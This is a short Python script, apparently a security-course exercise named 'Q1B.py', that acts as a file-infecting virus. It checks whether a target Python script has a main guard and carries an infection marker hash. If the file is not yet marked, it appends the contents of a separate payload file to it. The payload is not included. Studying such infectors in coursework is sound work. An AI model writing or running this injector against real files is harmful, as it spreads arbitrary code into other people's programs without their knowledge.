import sys
import os

def is_infected(target_file):
    id = "# 56858c6a52df13e2ae9f3a7cd02bc623c4b42d3670960249a6d50ebe4c5b9d7d"
    with open(target_file, "r") as file:
        for row in file:
            if row.strip() == id:
                return True
    return False

def is_script(script):
    required_statement = 'if __name__ == "__main__":'
    with open(script, 'r') as file:
        for row in file:
            if row.strip() == required_statement:
                return True
    return False

def verify(target_file):
    required_statement = 'if __name__ == "__main__":'
    code = None
    
    if not is_script(target_file):
        print(f"Could not verify file is python script; no {required_statement} statement")
        return 0
    # try:
    if is_infected(target_file):
        return 0
    # except:
    #     print("failed to check")
    #     return 0


    return 1
            # add statement to find if script exists


def inject(target_file, payload_file):
    with open(target_file, 'a+') as target_file, open(payload_file, 'r') as payload_file:
        target_file.write("\n")
        target_file.write(payload_file.read())

def main():

    if len(sys.argv) != 2:
        print(f"Usage: python3 Q1B.py [target_file]\n")
        return 1

    target_file = sys.argv[1]
    is_verified = verify(target_file)
    if not is_verified:
        print("Verifcation failed\n Quitting...")
        return 1

    payload_file = "Q1B_payload.py"
    try:
        injected = inject(target_file, payload_file)
    except:
        print(f"An error occured injecting {payload_file}.")
        return 1
    if injected == 1: return 1

    return 0

main()